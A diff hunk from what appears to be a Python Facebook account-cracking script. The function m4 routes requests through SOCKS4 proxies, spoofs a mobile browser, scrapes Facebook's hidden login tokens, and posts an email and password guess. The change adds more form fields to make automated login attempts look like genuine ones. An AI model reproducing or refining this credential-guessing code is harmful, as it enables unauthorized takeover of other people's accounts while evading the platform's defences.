@@ -1071,7 +1071,29 @@ def m4(idf,pwv):
       proxs= {'http': 'socks4://'+nip}
       ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
       free_fb = ses.get("https://m.facebook.com")
-      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":ps,"login":"Log In"}
+      dataa ={'m_ts':re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+'try_number': '0',
+'unrecognized_tries': '0',
+'email': idf,
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': 'false',
+'had_password_prefilled': 'false',
+'is_smart_lock': 'true',
+'bi_xrwh': '0',
+'pass': ps,
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+'dyn': '',
+'csr': '',
+'req': '3',
+'a': '',
+'__user': '0',
+'_fb_noscript': 'true'}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in free_fb.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
       heade={'authority':'m.facebook.com',
